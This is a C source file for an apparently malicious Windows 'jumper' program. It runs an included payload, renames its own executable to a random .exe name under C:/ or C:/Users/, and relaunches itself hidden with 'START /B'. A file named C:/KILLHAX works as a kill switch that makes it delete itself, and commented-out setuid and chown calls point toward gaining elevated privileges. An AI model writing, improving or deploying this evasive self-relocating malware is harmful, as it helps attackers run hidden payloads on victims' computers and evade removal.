
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <sys/time.h>
#include <time.h>
#include <string.h>
#include "payload.c"

#define FALSE 0
#define TRUE 1
#define ERROR -1
#define STOP "C:/KILLHAX"

int isKill(){
    if (access(STOP, F_OK) == FALSE ) {
        //file exists
        return TRUE;
    }
    //file does not exist
    return FALSE;
}

void rand_str(char *dest, size_t length) {
    struct timeval te;
    gettimeofday(&te, NULL);
    srand((unsigned int)te.tv_usec);
    char charset[] = "0123456789"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    while (length-- > 0) {
        size_t index = (double) rand() / RAND_MAX * (sizeof charset - 1);
        *dest++ = charset[index];
    }
    *dest = '\0';
}

int go(int argc, char *argv[]){
    //chown(argv[0], 0, 0);
    payload();
    struct timeval te;
    gettimeofday(&te, NULL);
    srand((unsigned int)te.tv_usec);
    struct timespec ts;
    ts.tv_sec = 1;
    ts.tv_nsec = (rand()%100+50) * 1000000;
    nanosleep(&ts, &ts);
    //sleep(SLEEP);
    char paths[3][50] = {
        "C:/",
        "C:/Users/",
        "C:/Windows/",
    };
    if (isKill() == TRUE){
        printf("Received emergency kill signal!\n");
        remove(argv[0]);
        return 1;
    }
    int string_len = 5;
    char str[] = { [5] = '\1' }; // make the last character non-zero so we can test based on it later
    rand_str(str, sizeof str - 1);
    assert(str[5] == '\0');      // test the correct insertion of string terminator
    //printf("%s\n", str);
    int i = -1;
    char *path = paths[rand()%2];
    strcat(path, str);
    strcat(path, ".exe");
    printf("Jumper is now at %s\n", path);
    rename(argv[0], path);
    if( access( path, F_OK ) != 0 ) {
        printf("ERR");
        return 0;
        return go(argc, argv);
    }
    char cmd[50] = "START /B ";
    strcat(cmd, path);
    //printf(cmd);
    system(cmd);
    return TRUE;
}

int main(int argc, char *argv[]){
    //setuid(0);
    return go(argc, argv);
}